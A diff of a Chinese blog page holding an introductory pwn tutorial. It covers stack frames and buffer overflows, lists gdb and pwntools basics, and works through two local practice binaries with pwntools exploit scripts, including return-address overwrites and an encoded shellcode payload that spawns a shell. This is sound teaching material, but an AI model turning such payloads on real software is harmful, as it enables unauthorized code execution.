@@ -11,13 +11,13 @@
   
   
   
-  <meta name="description" content="初涉PWN。">
+  <meta name="description" content="初涉 PWN。">
 <meta name="keywords" content="ctf,pwn">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PWN入门（二）">
 <meta property="og:url" content="https://qianfei11.github.io/2018/07/07/PWN入门（二）/index.html">
 <meta property="og:site_name" content="AssassinQ">
-<meta property="og:description" content="初涉PWN。">
+<meta property="og:description" content="初涉 PWN。">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://qianfei11.github.io/pics/BIN集训/PWN/二/1.jpg">
 <meta property="og:image" content="https://qianfei11.github.io/pics/BIN集训/PWN/二/2.png">
@@ -29,10 +29,10 @@
 <meta property="og:image" content="https://qianfei11.github.io/pics/BIN集训/PWN/二/8.png">
 <meta property="og:image" content="https://qianfei11.github.io/pics/BIN集训/PWN/二/9.png">
 <meta property="og:image" content="https://qianfei11.github.io/pics/BIN集训/PWN/二/10.png">
-<meta property="og:updated_time" content="2019-05-02T15:36:50.000Z">
+<meta property="og:updated_time" content="2019-08-26T05:53:21.579Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PWN入门（二）">
-<meta name="twitter:description" content="初涉PWN。">
+<meta name="twitter:description" content="初涉 PWN。">
 <meta name="twitter:image" content="https://qianfei11.github.io/pics/BIN集训/PWN/二/1.jpg">
   
     <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
@@ -163,13 +163,13 @@
     </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p>初涉PWN。</p>
+        <p>初涉 PWN。</p>
 <a id="more"></a>
-<h1 id="关于PWN底层的原理"><a href="#关于PWN底层的原理" class="headerlink" title="关于PWN底层的原理"></a>关于PWN底层的原理</h1><h2 id="栈帧平衡"><a href="#栈帧平衡" class="headerlink" title="栈帧平衡"></a>栈帧平衡</h2><p>一些基本内容：</p>
+<h1 id="关于-PWN-底层的原理"><a href="#关于-PWN-底层的原理" class="headerlink" title="关于 PWN 底层的原理"></a>关于 PWN 底层的原理</h1><h2 id="栈帧平衡"><a href="#栈帧平衡" class="headerlink" title="栈帧平衡"></a>栈帧平衡</h2><p>一些基本内容：</p>
 <ul>
 <li>ESP：栈指针寄存器，存放一个指针，该指针永远指向系统栈最上面的栈帧的栈顶</li>
 <li>EBP：基址指针寄存器，该指针永远指向系统栈最上面的栈帧的底部</li>
-<li>函数栈帧：ESP和EBP之间内存空间为当前栈帧</li>
+<li>函数栈帧：ESP 和 EBP 之间内存空间为当前栈帧</li>
 </ul>
 <p>在函数栈帧中一般包含以下几种信息：</p>
 <ul>
@@ -182,17 +182,17 @@
 <p><img src="/pics/BIN集训/PWN/二/1.jpg" alt="调用函数后，会先保留旧的栈帧并建立新的栈帧（这里栈底在上，栈顶在下）"></p>
 <p>函数返回的步骤：</p>
 <ol>
-<li>保存返回值，通常将函数的返回值保存在寄存器EAX中。 </li>
-<li>弹出当前帧，恢复上一个栈帧。具体包括：<1> 在堆栈平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收当前栈帧的空间。<2> 将当前栈帧底部保存的前栈帧EBP值弹入EBP寄存器，恢复出上一个栈帧。<3> 将函数返回地址弹给EIP寄存器。</3></2></1></li>
+<li>保存返回值，通常将函数的返回值保存在寄存器 EAX 中。</li>
+<li>弹出当前帧，恢复上一个栈帧。具体包括：<1> 在堆栈平衡的基础上，给 ESP 加上栈帧的大小，降低栈顶，回收当前栈帧的空间。<2> 将当前栈帧底部保存的前栈帧 EBP 值弹入 EBP 寄存器，恢复出上一个栈帧。<3> 将函数返回地址弹给 EIP 寄存器。</3></2></1></li>
 <li>跳转：按照函数返回地址跳回母函数中继续执行。</li>
 </ol>
 <p><img src="/pics/BIN集训/PWN/二/2.png" alt="每次调用一个函数都会新增一个栈帧（这里栈底在下，栈顶在上）"></p>
-<p>PS：栈的守护天使——GS，也称作Stack Canary/Cookie</p>
-<h2 id="调用函数（Call）"><a href="#调用函数（Call）" class="headerlink" title="调用函数（Call）"></a>调用函数（Call）</h2><p>CALL可以化为两部分，即<code>Push retaddr + Jump</code>。先讲函数返回的地址入栈，再跳转到函数执行的位置处。</p>
-<h2 id="返回值（Ret）"><a href="#返回值（Ret）" class="headerlink" title="返回值（Ret）"></a>返回值（Ret）</h2><p>RET也可以转化为两部分，即<code>Pop retaddr + Jump</code>。先是把返回值的地址出栈，再跳转回原本调用函数处。</p>
+<p>PS：栈的守护天使——GS，也称作 Stack Canary/Cookie</p>
+<h2 id="调用函数（Call）"><a href="#调用函数（Call）" class="headerlink" title="调用函数（Call）"></a>调用函数（Call）</h2><p>CALL 可以化为两部分，即<code>Push retaddr + Jump</code>。先讲函数返回的地址入栈，再跳转到函数执行的位置处。</p>
+<h2 id="返回值（Ret）"><a href="#返回值（Ret）" class="headerlink" title="返回值（Ret）"></a>返回值（Ret）</h2><p>RET 也可以转化为两部分，即<code>Pop retaddr + Jump</code>。先是把返回值的地址出栈，再跳转回原本调用函数处。</p>
 <h1 id="缓冲区溢出（Buffer-Overflow）"><a href="#缓冲区溢出（Buffer-Overflow）" class="headerlink" title="缓冲区溢出（Buffer Overflow）"></a>缓冲区溢出（Buffer Overflow）</h1><p>缓冲区溢出是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容，从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。 缓冲区溢出原指当某个数据超过了处理程序限制的范围时，程序出现的异常操作。</p>
-<p>尤其是C语言，不像其他一些高级语言会自动进行数组或者指针的边界检查，增加溢出风险。C语言中的C标准库还具有一些非常危险的操作函数，使用不当也为溢出创造条件。</p>
-<h1 id="Linux下的Pwn常用命令"><a href="#Linux下的Pwn常用命令" class="headerlink" title="Linux下的Pwn常用命令"></a>Linux下的Pwn常用命令</h1><table>
+<p>尤其是 C 语言，不像其他一些高级语言会自动进行数组或者指针的边界检查，增加溢出风险。C 语言中的 C 标准库还具有一些非常危险的操作函数，使用不当也为溢出创造条件。</p>
+<h1 id="Linux-下的-Pwn-常用命令"><a href="#Linux-下的-Pwn-常用命令" class="headerlink" title="Linux 下的 Pwn 常用命令"></a>Linux 下的 Pwn 常用命令</h1><table>
 <thead>
 <tr>
 <th style="text-align:center">命令</th>
@@ -226,26 +226,26 @@
 </tr>
 <tr>
 <td style="text-align:center">gdb</td>
-<td style="text-align:center">使用gdb进行调试</td>
+<td style="text-align:center">使用 gdb 进行调试</td>
 </tr>
 <tr>
 <td style="text-align:center">checksec</td>
-<td style="text-align:center">检测二进制的保护机制是否开启（peda中的命令）</td>
+<td style="text-align:center">检测二进制的保护机制是否开启（peda 中的命令）</td>
 </tr>
 </tbody>
 </table>
-<h1 id="Linux下的Pwn常用到的工具"><a href="#Linux下的Pwn常用到的工具" class="headerlink" title="Linux下的Pwn常用到的工具"></a>Linux下的Pwn常用到的工具</h1><ul>
-<li>gdb：Linux调试中必要用到的</li>
-<li>gdb-peda：gdb方便调试的工具，类似的工具有gef，gdbinit，这些工具的安装可以参考：<a href="http://blog.csdn.net/gatieme/article/details/63254211" target="_blank" rel="noopener">http://blog.csdn.net/gatieme/article/details/63254211</a></li>
-<li>pwntools：写exp和poc的利器</li>
-<li>checksec：可以很方便的知道elf程序的安全性和程序的运行平台</li>
-<li>objdump和readelf：可以很快的知道elf程序中的关键信息</li>
+<h1 id="Linux-下的-Pwn-常用到的工具"><a href="#Linux-下的-Pwn-常用到的工具" class="headerlink" title="Linux 下的 Pwn 常用到的工具"></a>Linux 下的 Pwn 常用到的工具</h1><ul>
+<li>gdb：Linux 调试中必要用到的</li>
+<li>gdb-peda：gdb 方便调试的工具，类似的工具有 gef，gdbinit，这些工具的安装可以参考：<a href="http://blog.csdn.net/gatieme/article/details/63254211" target="_blank" rel="noopener">http://blog.csdn.net/gatieme/article/details/63254211</a></li>
+<li>pwntools：写 exp 和 poc 的利器</li>
+<li>checksec：可以很方便的知道 elf 程序的安全性和程序的运行平台</li>
+<li>objdump 和 readelf：可以很快的知道 elf 程序中的关键信息</li>
 <li>ida pro：强大的反编译工具</li>
-<li>ROPgadget：强大的rop利用工具</li>
-<li>one_gadget：可以快速的寻找libc中的调用exec(‘bin/sh’)的位置</li>
-<li>libc-database：可以通过泄露的libc的某个函数地址查出远程系统是用的哪个libc版本</li>
+<li>ROPgadget：强大的 rop 利用工具</li>
+<li>one_gadget：可以快速的寻找 libc 中的调用 exec(‘bin/sh’)的位置</li>
+<li>libc-database：可以通过泄露的 libc 的某个函数地址查出远程系统是用的哪个 libc 版本</li>
 </ul>
-<h1 id="gdb基本命令"><a href="#gdb基本命令" class="headerlink" title="gdb基本命令"></a>gdb基本命令</h1><table>
+<h1 id="gdb-基本命令"><a href="#gdb-基本命令" class="headerlink" title="gdb 基本命令"></a>gdb 基本命令</h1><table>
 <thead>
 <tr>
 <th style="text-align:center">命令</th>
@@ -307,7 +307,7 @@
 </tr>
 </tbody>
 </table>
-<h1 id="Pwntools基本函数"><a href="#Pwntools基本函数" class="headerlink" title="Pwntools基本函数"></a>Pwntools基本函数</h1><table>
+<h1 id="Pwntools-基本函数"><a href="#Pwntools-基本函数" class="headerlink" title="Pwntools 基本函数"></a>Pwntools 基本函数</h1><table>
 <thead>
 <tr>
 <th style="text-align:center">函数</th>
@@ -336,11 +336,11 @@
 </tr>
 <tr>
 <td style="text-align:center">p32()/p64()</td>
-<td style="text-align:center">把整数转化为32/64位的字符串</td>
+<td style="text-align:center">把整数转化为 32/64 位的字符串</td>
 </tr>
 <tr>
 <td style="text-align:center">u32()/u64()</td>
-<td style="text-align:center">把32/64位字符串转化成整数</td>
+<td style="text-align:center">把 32/64 位字符串转化成整数</td>
 </tr>
 <tr>
 <td style="text-align:center">asm()/disasm()</td>
@@ -352,24 +352,24 @@
 </tr>
 </tbody>
 </table>
-<h1 id="Pwn的小练习"><a href="#Pwn的小练习" class="headerlink" title="Pwn的小练习"></a>Pwn的小练习</h1><p>第一次做pwn题，虽然是在有源码的情况下。但是还是被pwn的神奇所震撼。</p>
+<h1 id="Pwn-的小练习"><a href="#Pwn-的小练习" class="headerlink" title="Pwn 的小练习"></a>Pwn 的小练习</h1><p>第一次做 pwn 题，虽然是在有源码的情况下。但是还是被 pwn 的神奇所震撼。</p>
 <h2 id="p1"><a href="#p1" class="headerlink" title="p1"></a>p1</h2><p>程序源码：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vmd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">"sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	A();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>输入<code>gcc p1.c -o p1 -m32</code>，用来编译32位的程序。</p>
-<h3 id="直接覆盖返回地址"><a href="#直接覆盖返回地址" class="headerlink" title="直接覆盖返回地址"></a>直接覆盖返回地址</h3><p>根据源文件可以判断该程序调用<code>A()</code>函数时，在scanf中没有对字符串的长度做限制，即存在缓冲区溢出。</p>
-<p>根据源码，本题的思路应该为通过缓冲区溢出，将RET处的地址修改为<code>cmd()</code>函数的地址，直接跳转到该函数后getshell。故先通过<code>objdump</code>命令寻找到cmd函数的地址</p>
+<p>输入<code>gcc p1.c -o p1 -m32</code>，用来编译 32 位的程序。</p>
+<h3 id="直接覆盖返回地址"><a href="#直接覆盖返回地址" class="headerlink" title="直接覆盖返回地址"></a>直接覆盖返回地址</h3><p>根据源文件可以判断该程序调用<code>A()</code>函数时，在 scanf 中没有对字符串的长度做限制，即存在缓冲区溢出。</p>
+<p>根据源码，本题的思路应该为通过缓冲区溢出，将 RET 处的地址修改为<code>cmd()</code>函数的地址，直接跳转到该函数后 getshell。故先通过<code>objdump</code>命令寻找到 cmd 函数的地址</p>
 <p><img src="/pics/BIN集训/PWN/二/3.png" alt="找到cmd函数的地址"></p>
-<p>然后输入<code>gdb p1</code>进入gdb调试界面。<code>start</code>开始调试程序。</p>
+<p>然后输入<code>gdb p1</code>进入 gdb 调试界面。<code>start</code>开始调试程序。</p>
 <p><img src="/pics/BIN集训/PWN/二/4.png" alt="自上而下分别为寄存器、代码段、栈段"></p>
 <p><img src="/pics/BIN集训/PWN/二/5.png" alt="单步进入A()"></p>
 <p><img src="/pics/BIN集训/PWN/二/6.png" alt="单步执行到scanf后，用pattc命令构造出一段较长的字符"></p>
 <p><img src="/pics/BIN集训/PWN/二/7.png" alt="继续单步执行，程序报错返回RET处的地址"></p>
 <p><img src="/pics/BIN集训/PWN/二/8.png" alt="使用patto命令查找得到偏移量"></p>
-<p>已知偏移量为112后，容易知道可以直接通过溢出在RET处覆盖原本的地址，直接跳至<code>cmd()</code>函数处。</p>
-<p>payload如下：</p>
+<p>已知偏移量为 112 后，容易知道可以直接通过溢出在 RET 处覆盖原本的地址，直接跳至<code>cmd()</code>函数处。</p>
+<p>payload 如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">112</span> + <span class="string">"\x6b\x84\x04\x08"</span></span><br><span class="line">p = process(<span class="string">"./p1"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="Ret-slide"><a href="#Ret-slide" class="headerlink" title="Ret_slide"></a><strong>Ret_slide</strong></h3><p>在不知道返回地址偏移时，通过滑翔机（Ret_slide）设置payload减少尝试次数。即RET前的字符串利用其他RET地址来填充。</p>
-<p>因为RET相当于POP和JMP两个步骤，每次RET都会重新返回到上一个地址，最后执行到目标地址时就会直接跳转。</p>
+<h3 id="Ret-slide"><a href="#Ret-slide" class="headerlink" title="Ret_slide"></a><strong>Ret_slide</strong></h3><p>在不知道返回地址偏移时，通过滑翔机（Ret_slide）设置 payload 减少尝试次数。即 RET 前的字符串利用其他 RET 地址来填充。</p>
+<p>因为 RET 相当于 POP 和 JMP 两个步骤，每次 RET 都会重新返回到上一个地址，最后执行到目标地址时就会直接跳转。</p>
 <p>payload：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">"\x08\x04\x84\xa0"</span> * <span class="number">28</span> + <span class="string">"\x6b\x84\x04\x08"</span></span><br><span class="line">p = process(<span class="string">"./p1"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="3-13"><a href="#3-13" class="headerlink" title="3-13"></a>3-13</h2><p>程序源码：</p>
@@ -377,15 +377,15 @@
 <p>同样输入<code>gcc 3-13.c -o 3-13 -m32</code>来编译。</p>
 <p>调试一开始发现权限不够，通过<code>chmod +x 3-13</code>来获得可执行权限。</p>
 <p><img src="/pics/BIN集训/PWN/二/9.png" alt="修改权限"></p>
-<p>源代码中使用了<code>gets()</code>函数，存在缓存区溢出，故第一个想法应该就是通过对变量<code>buf</code>操作使其覆盖变量<code>magic</code>的值，使两者相同后得到shell。</p>
-<p><code>buf</code>被定义为一个占100字节的字符串，而<code>magic</code>被定义为一个占4字节的整型。</p>
+<p>源代码中使用了<code>gets()</code>函数，存在缓存区溢出，故第一个想法应该就是通过对变量<code>buf</code>操作使其覆盖变量<code>magic</code>的值，使两者相同后得到 shell。</p>
+<p><code>buf</code>被定义为一个占 100 字节的字符串，而<code>magic</code>被定义为一个占 4 字节的整型。</p>
 <p><img src="/pics/BIN集训/PWN/二/10.png" alt="左侧文本记录了在调试过程中记录下的两个变量的地址"></p>
-<p>根据调试过程可以知道，<code>buf</code>的地址为0xffffcf68，而<code>magic</code>的地址为0xffffcfcc。<code>buf</code>的地址比<code>magic</code>的地址更低，两者在栈中显然是先压入<code>magic</code>再压入<code>buf</code>。又因为输入数据是从低位向高位输入，那么我们可以通过变化<code>buf</code>的值来覆盖<code>magic</code>的值。最简单的方法显然是让两者都等于零。</p>
-<p>根据以上的推测，那么输入字符串的长度应当至少为100+4=104字节才可能完全覆盖变量<code>magic</code>。</p>
-<p>故payload为：</p>
+<p>根据调试过程可以知道，<code>buf</code>的地址为 0xffffcf68，而<code>magic</code>的地址为 0xffffcfcc。<code>buf</code>的地址比<code>magic</code>的地址更低，两者在栈中显然是先压入<code>magic</code>再压入<code>buf</code>。又因为输入数据是从低位向高位输入，那么我们可以通过变化<code>buf</code>的值来覆盖<code>magic</code>的值。最简单的方法显然是让两者都等于零。</p>
+<p>根据以上的推测，那么输入字符串的长度应当至少为 100+4=104 字节才可能完全覆盖变量<code>magic</code>。</p>
+<p>故 payload 为：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./3-13'</span>)</span><br><span class="line">payload = <span class="string">'\0'</span> * <span class="number">104</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>这里的<code>\0</code>也就是<code>\x00</code>，而如果输入的是字符<code>0</code>，转为十六进制后为<code>\x30</code>，将不能满足条件，无法getshell。</p>
-<p>这题附上梅大佬的payload，这里可以放shellcode：</p>
+<p>这里的<code>\0</code>也就是<code>\x00</code>，而如果输入的是字符<code>0</code>，转为十六进制后为<code>\x30</code>，将不能满足条件，无法 getshell。</p>
+<p>这题附上梅大佬的 payload，这里可以放 shellcode：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">offset=<span class="number">116</span></span><br><span class="line">r=process(<span class="string">"3-13"</span>)</span><br><span class="line">elf=ELF(<span class="string">"3-13"</span>)</span><br><span class="line">bss=elf.bss()</span><br><span class="line">get=elf.symbols[<span class="string">'gets'</span>]</span><br><span class="line">shell=<span class="string">"\xeb\x1b\x5f\x31\xc0\x6a\x53\x6a\x18\x59\x49\x5b\x8a\x04\x0f\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8\xe0\xff\xff\xff\x1c\x7f\xc5\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2\xf4\x1f\x95\x4e\xfe\x25\x97\x93\x30\xb6\x39\xb2\x2c"</span></span><br><span class="line">payload=<span class="string">"A"</span>*offset+p32(get)+p32(bss)+p32(bss)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shell)</span><br><span class="line">r.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA</a><br><a href="https://paper.seebug.org/481/" target="_blank" rel="noopener">https://paper.seebug.org/481/</a><br><a href="https://bbs.pediy.com/thread-212691.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-212691.htm</a><br><a href="http://blog.xiyoulinux.org/detail.jsp?id=1965" target="_blank" rel="noopener">http://blog.xiyoulinux.org/detail.jsp?id=1965</a><br><a href="http://www.cnitblog.com/houcy/archive/2013/03/16/87075.html" target="_blank" rel="noopener">http://www.cnitblog.com/houcy/archive/2013/03/16/87075.html</a><br><a href="https://blog.csdn.net/qq_29343201/article/details/51337025" target="_blank" rel="noopener">https://blog.csdn.net/qq_29343201/article/details/51337025</a><br><a href="http://www.91ri.org/14382.html" target="_blank" rel="noopener">http://www.91ri.org/14382.html</a></p>
 
@@ -456,7 +456,7 @@
     <div id="toc" class="toc-article">
     <strong class="toc-title">Contents</strong>
     
-      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#关于PWN底层的原理"><span class="nav-number">1.</span> <span class="nav-text">关于PWN底层的原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#栈帧平衡"><span class="nav-number">1.1.</span> <span class="nav-text">栈帧平衡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调用函数（Call）"><span class="nav-number">1.2.</span> <span class="nav-text">调用函数（Call）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#返回值（Ret）"><span class="nav-number">1.3.</span> <span class="nav-text">返回值（Ret）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#缓冲区溢出（Buffer-Overflow）"><span class="nav-number">2.</span> <span class="nav-text">缓冲区溢出（Buffer Overflow）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux下的Pwn常用命令"><span class="nav-number">3.</span> <span class="nav-text">Linux下的Pwn常用命令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux下的Pwn常用到的工具"><span class="nav-number">4.</span> <span class="nav-text">Linux下的Pwn常用到的工具</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#gdb基本命令"><span class="nav-number">5.</span> <span class="nav-text">gdb基本命令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwntools基本函数"><span class="nav-number">6.</span> <span class="nav-text">Pwntools基本函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn的小练习"><span class="nav-number">7.</span> <span class="nav-text">Pwn的小练习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#p1"><span class="nav-number">7.1.</span> <span class="nav-text">p1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#直接覆盖返回地址"><span class="nav-number">7.1.1.</span> <span class="nav-text">直接覆盖返回地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ret-slide"><span class="nav-number">7.1.2.</span> <span class="nav-text">Ret_slide</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-13"><span class="nav-number">7.2.</span> <span class="nav-text">3-13</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考网站"><span class="nav-number">8.</span> <span class="nav-text">参考网站</span></a></li></ol>
+      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#关于-PWN-底层的原理"><span class="nav-number">1.</span> <span class="nav-text">关于 PWN 底层的原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#栈帧平衡"><span class="nav-number">1.1.</span> <span class="nav-text">栈帧平衡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调用函数（Call）"><span class="nav-number">1.2.</span> <span class="nav-text">调用函数（Call）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#返回值（Ret）"><span class="nav-number">1.3.</span> <span class="nav-text">返回值（Ret）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#缓冲区溢出（Buffer-Overflow）"><span class="nav-number">2.</span> <span class="nav-text">缓冲区溢出（Buffer Overflow）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-下的-Pwn-常用命令"><span class="nav-number">3.</span> <span class="nav-text">Linux 下的 Pwn 常用命令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-下的-Pwn-常用到的工具"><span class="nav-number">4.</span> <span class="nav-text">Linux 下的 Pwn 常用到的工具</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#gdb-基本命令"><span class="nav-number">5.</span> <span class="nav-text">gdb 基本命令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwntools-基本函数"><span class="nav-number">6.</span> <span class="nav-text">Pwntools 基本函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn-的小练习"><span class="nav-number">7.</span> <span class="nav-text">Pwn 的小练习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#p1"><span class="nav-number">7.1.</span> <span class="nav-text">p1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#直接覆盖返回地址"><span class="nav-number">7.1.1.</span> <span class="nav-text">直接覆盖返回地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ret-slide"><span class="nav-number">7.1.2.</span> <span class="nav-text">Ret_slide</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-13"><span class="nav-number">7.2.</span> <span class="nav-text">3-13</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考网站"><span class="nav-number">8.</span> <span class="nav-text">参考网站</span></a></li></ol>
     
     </div>
   </aside>
